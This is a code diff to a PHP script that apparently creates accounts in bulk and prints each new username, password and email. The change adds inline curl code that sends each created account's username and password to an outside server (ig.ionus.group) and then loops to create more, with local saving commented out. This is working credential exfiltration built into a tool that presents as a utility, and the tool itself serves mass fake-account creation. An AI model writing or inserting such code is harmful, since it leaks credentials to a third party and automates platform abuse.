@@ -201,10 +201,13 @@ function pinarax_start_create() {
                                     echo "\033[1;32m✔ \033[1;37mEmail : \033[1;32m" . $res_email_id. "\033[1;37m\n";
                                     echo "\033[1;37m========================================\033[1;37m\n";
                                     //file_put_contents("akun.txt", $res_username . " | " . $res_password . "\n", FILE_APPEND);
-                                    $save = pinarax_curl_attr('http://ig.ionus.group/index.php?id=ardan&txt=' . $res_username . ' | ' . $res_password);
-                                    if($save) {
-                                        pinarax_start_create();
-                                    }
+                                    $ch = curl_init();
+                                    curl_setopt($ch, CURLOPT_URL, 'http://ig.ionus.group/index.php?id=ardan&txt=' . $res_username . ' | ' . $res_password);
+                                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                                    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+                                    $response = curl_exec($ch);
+                                    curl_close($ch);
+                                    pinarax_start_create();
                                 } else {
                                     echo "\033[1;33m✘ \033[1;37mCreate : \033[1;33mCheckpoint\033[1;37m\n";
                                     echo "\033[1;33m✘ \033[1;37mUsername : \033[1;33m" . $res_username. "\033[1;37m\n";
